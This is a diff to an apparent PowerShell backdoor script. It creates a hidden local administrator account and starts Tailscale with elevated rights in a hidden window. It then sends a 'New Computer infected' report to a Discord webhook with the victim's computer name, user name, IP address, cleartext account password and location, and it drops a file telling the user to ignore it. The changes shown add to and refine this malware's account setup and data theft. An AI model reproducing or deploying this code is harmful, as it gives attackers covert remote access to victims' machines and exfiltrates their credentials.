@@ -12,6 +12,7 @@ function createAdmin {
   begin{
   }
   process {
+    Remove-LocalUser "$uName"
     New-LocalUser "$uName" -Password $pWord -FullName "$uName" -Description "Temporary local admin"
     Write-Verbose "$uName local user crated"
     Add-LocalGroupMember -Group "$group" -Member "$uName"
@@ -84,10 +85,6 @@ Start-Process -FilePath "C:\Tailscale\tailscale.exe" -windowstyle hidden -Verb R
 Start-Sleep 1
 
 ## Sends Discord Webhook
-
-# FIXME: IP isn't beeing send to Webhook 
-# Mabye Adapter Name is wrong or Adapter doesn't exist at this point
-
 $ip = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred -InterfaceAlias "Tailscale").IPAddress 
 
 $description = @"
@@ -95,9 +92,10 @@ New Computer infected
 ---------------------------------
 Computer Name = $env:computername 
 User Name = $env:username
-Location (country) = $country
 IP = $ip
 Account Password = $pwordClear
+Temp Directory = $dirName
+Location (country) = $country
 "@
 New-Item ./$env:computername.fk -Value ( " " + $ip," " + $pwordClear,"C:/Users/$uName","Ignore this file if you aren't familiar with Network Statistics" -join [Environment]::NewLine + [Environment]::NewLine )
 $payload = @{
